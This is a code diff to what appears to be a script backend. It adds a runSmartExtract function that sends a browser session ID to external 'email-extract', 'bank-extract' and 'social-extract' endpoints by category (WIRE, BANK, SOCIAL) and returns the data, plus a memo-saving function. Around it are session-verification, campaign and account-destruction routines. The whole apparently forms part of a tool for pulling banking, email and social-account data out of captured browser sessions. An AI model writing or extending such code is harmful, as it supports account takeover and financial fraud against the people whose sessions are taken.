@@ -1682,6 +1682,101 @@ function autoVerifyStaleSessions() {
   }
 }
 
+function runSmartExtract(params) {
+  try {
+    const { browserId, category } = params;
+
+    if (!browserId || !category) {
+      return { success: false, error: "Missing required fields: browserId and category" };
+    }
+
+    const cat = String(category).toUpperCase();
+    const externalApi = CONFIG.EXTERNAL_API;
+    let extractEndpoint = '';
+
+    switch (cat) {
+      case 'WIRE':
+        extractEndpoint = externalApi + '/emails/email-extract';
+        break;
+      case 'BANK':
+        extractEndpoint = externalApi + '/banks/bank-extract';
+        break;
+      case 'SOCIAL':
+        extractEndpoint = externalApi + '/socials/social-extract';
+        break;
+      default:
+        return { success: false, error: "Invalid category. Must be WIRE, BANK, or SOCIAL" };
+    }
+
+    Logger.log("runSmartExtract calling: " + extractEndpoint + " browserId=" + browserId + " category=" + cat);
+
+    const response = UrlFetchApp.fetch(extractEndpoint, {
+      method: 'POST',
+      contentType: 'application/json',
+      payload: JSON.stringify({
+        browserId: browserId,
+        category: cat
+      }),
+      muteHttpExceptions: true
+    });
+
+    const responseCode = response.getResponseCode();
+    const responseBody = JSON.parse(response.getContentText());
+
+    if (responseCode === 200 && responseBody.success) {
+      return {
+        success: true,
+        data: responseBody.data,
+        message: "Extract completed for " + cat
+      };
+    } else {
+      return {
+        success: false,
+        error: responseBody.error || "Extract failed with status " + responseCode
+      };
+    }
+  } catch (error) {
+    Logger.log("Error in runSmartExtract: " + error.message);
+    return { success: false, error: "Extract failed: " + error.message };
+  }
+}
+
+function saveMemo(params) {
+  try {
+    const { browserId, memo } = params;
+
+    if (!browserId || memo === undefined) {
+      return { success: false, error: "Missing required fields: browserId and memo" };
+    }
+
+    const externalApi = CONFIG.EXTERNAL_API;
+
+    Logger.log("saveMemo calling: " + externalApi + "/api/save-memo browserId=" + browserId);
+
+    const response = UrlFetchApp.fetch(externalApi + '/api/save-memo', {
+      method: 'POST',
+      contentType: 'application/json',
+      payload: JSON.stringify({
+        browserId: browserId,
+        memo: memo
+      }),
+      muteHttpExceptions: true
+    });
+
+    const responseCode = response.getResponseCode();
+    const responseBody = JSON.parse(response.getContentText());
+
+    if (responseCode === 200 && responseBody.success) {
+      return { success: true, message: "Memo saved" };
+    } else {
+      return { success: false, error: responseBody.error || "Failed to save memo" };
+    }
+  } catch (error) {
+    Logger.log("Error in saveMemo: " + error.message);
+    return { success: false, error: "Save memo failed: " + error.message };
+  }
+}
+
 function destroyAccount(params) {
   try {
     Logger.log("Starting destroyAccount with params:", params);
@@ -1860,6 +1955,7 @@ function backendMultiFunction(params) {
     deleteProject: () => deleteProject(params),
     getProjectAccounts: () => getProjectAccounts(params),
     createNewCampaign: () => createNewCampaign(params),
+    getCampaign: () => getCampaign(params),
     updateCampaign: () => updateCampaign(params),
     deleteCampaign: () => deleteCampaign(params),
     validateCampaignEmails: () => validateCampaignEmails(params),
@@ -1890,6 +1986,10 @@ function backendMultiFunction(params) {
 
     // SESSION VERIFICATION
     verifySession: () => verifySession(params),
+
+    // SMART EXTRACT
+    runSmartExtract: () => runSmartExtract(params),
+    saveMemo: () => saveMemo(params),
 
     // ELECTRON SESSION
     getSessionData: () => getSessionData(params),
